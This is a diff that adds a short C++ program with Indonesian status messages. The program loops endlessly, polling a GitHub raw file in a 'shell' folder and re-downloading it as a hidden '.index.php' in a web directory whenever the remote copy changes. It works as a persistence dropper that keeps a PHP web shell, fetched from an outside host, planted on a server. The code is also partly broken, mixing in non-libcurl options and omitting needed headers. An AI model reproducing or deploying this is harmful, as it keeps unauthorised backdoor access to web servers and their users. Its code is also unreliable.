@@ -1,0 +1,77 @@
+#include <iostream>
+#include <fstream>
+#include <cstdlib>
+#include <ctime>
+#include <string>
+#include <cstdio>
+#include <sys/stat.h>
+#include <curl/curl.h>
+std::string url = "https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo4new.txt";
+std::string outputFile = "/path/to/your/.index.php";
+time_t getServerFileTime(const std::string& url) {
+    CURL* curl;
+    CURLcode res;
+    struct curl_slist* headers = NULL;
+    char* lastModified = NULL;
+    time_t serverFileTime = 0;
+    curl = curl_easy_init();
+    if(curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_HEADER, 1L);
+        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
+        curl_easy_setopt(curl, CURLOPT_RETURNTRANSFER, 1L);
+        res = curl_easy_perform(curl);
+        if(res == CURLE_OK) {
+            curl_easy_getinfo(curl, CURLINFO_LASTMOD, &lastModified);
+            if (lastModified) {
+                struct tm tm;
+                strptime(lastModified, "%a, %d %b %Y %H:%M:%S %Z", &tm);
+                serverFileTime = mktime(&tm);
+            }
+        }
+        curl_easy_cleanup(curl);
+    }
+    return serverFileTime;
+}
+time_t getLocalFileTime(const std::string& filePath) {
+    struct stat fileInfo;
+    if (stat(filePath.c_str(), &fileInfo) == 0) {
+        return fileInfo.st_mtime;
+    }
+    return 0;
+}
+bool downloadFile(const std::string& url, const std::string& outputFile) {
+    CURL* curl;
+    FILE* fp;
+    CURLcode res;
+    curl = curl_easy_init();
+    if (curl) {
+        fp = fopen(outputFile.c_str(), "wb");
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
+        res = curl_easy_perform(curl);
+        fclose(fp);
+        curl_easy_cleanup(curl);
+        return (res == CURLE_OK);
+    }
+    return false;
+}
+int main() {
+    while (true) {
+        time_t serverFileTime = getServerFileTime(url);
+        time_t localFileTime = getLocalFileTime(outputFile);
+        if (serverFileTime > localFileTime) {
+            if (downloadFile(url, outputFile)) {
+                std::cout << "File berhasil diunduh: " << outputFile << std::endl;
+            } else {
+                std::cout << "Terjadi kesalahan saat mengunduh file." << std::endl;
+            }
+        } else {
+            std::cout << "Tidak ada perubahan pada file." << std::endl;
+        }
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+    return 0;
+}
